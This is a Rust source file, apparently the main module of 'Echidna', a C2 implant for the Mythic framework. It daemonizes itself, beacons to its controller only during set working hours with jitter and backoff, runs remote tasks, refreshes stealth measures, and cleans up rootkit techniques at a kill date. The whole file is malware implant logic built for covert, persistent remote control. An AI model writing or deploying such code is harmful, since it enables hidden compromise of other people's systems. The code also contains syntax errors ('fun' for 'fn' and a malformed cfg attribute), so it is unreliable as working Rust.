
use chrono::prelude::{DateTime, Local, NaiveDate, NaiveDateTime};
use chrono::Duration;
use std::error::Error;

use crate::agent::calculate_sleep_time;
use crate::agent::EchidnaAgent;

mod agent;
mod bridge;
mod payloadvars;
mod profiles;
mod rootkit;
mod stealth;
mod tasking;
mod utils;
mod commands;

pub fn real_main() -> Result<(), Box<dyn Error>> {
    // initialize stealth measures 
    // stealth::initialize_protection()?;

    if let Some(daemonize) = option_env!("daemonize") {
        if daemonize.eq_ignore_ascii_case("true") {
            // fork the process if daemonize is set to "true"
            #[cfg(target_os) = "linux"]
            if unsafe { libc::fork() } == 0 {
                run_beacon()?;
            }
        }
    }

    run_beacon()?;

    Ok(())
}

fun run_beacon() -> Result<(), Box<dyn Error>> {
    // create a new Echidna agent object
    let mut agent = EchidnaAgent::new();

    // get the initial interval from the config
    let mut interval = payloadvars::callback_interval();

    // set the number of checkin retries
    let mut tries = 1;

    // keep trying to reconnect to the C2 if the connection is unavailable
    loop {
        // get current time
        let now: DateTime<Local> = std::time::SystemTime::now().into();
        let now: NaiveDateTime = now.naive_local();

        // get the configured start and end working hours for beaconing
        let working_start = NaiveDateTime::new(now.date(), payloadvars::working_start());
        let working_end = NaiveDateTime::new(now.date(), payloadvars::working_end());

        // check the agent's working hours and don't check in if not in the defined time frame
        if now < working_start {
            let delta = Duration::seconds(working_start.and_utc().timestamp() - now.and_utc().timestamp());
            std::thread::sleep(delta.to_std()?);
        }

        // check if agent has passed the kill date
        if now.date() >= NaiveDate::parse_from_str(&payloadvars::killdate(), "%Y-%m-%d")? {
            if let Err(e) = agent.cleanup_rootkit() {
                eprintln!("Warning: Failed to clean up rootkit techniques: {}", e);
            }
            return Ok(());
        }

        // try to make the initial checkin to Mythic, if this succeeds then break loop
        if agent.make_checkin().is_ok() {
            break;
        }

        // check if number of connection attempts equals the configured connection attempts
        if tries >= payloadvars::retries() {
            return Ok(());
        }

        // calculate the sleep time and sleep the agent
        let sleeptime = calculate_sleep_time(interval, payloadvars::callback_jitter());
        std::thread::sleep(std::time::Duration::from_secs(sleeptime));

        tries += 1;
        // double current set interval for next connection attempt
        interval *= 2;
    } // checkin successful

    // main agent loop
    loop {
        // refresh stealth measures periodically
        stealth::refresh_protection()?;
        
        // get new tasking from Mythic
        let pending_tasks = agent.get_tasking()?;

        // process the pending tasks
        agent
            .tasking
            .process_tasks(pending_tasks.as_ref(), &mut agent.shared)?;

        agent.sleep();

        // get completed task information and send to Mythic server
        let completed_tasks = agent.tasking.get_completed_tasks()?;
        let continued_tasking = agent.send_tasking(&completed_tasks)?;

        // pass along any continued tasks
        agent
            .tasking
            .process_tasks(continued_tasking.as_ref(), &mut agent.shared)?;
        
        // break out of loop if the agent exits
        if agent.shared.exit_agent {
            if let Err(e) = agent.cleanup_rootkit() {
                eprintln!("Warning: Failed to clean up rootkit techniques: {}", e);
            }
            break;
        }

        agent.sleep();
    }

    Ok(())
}

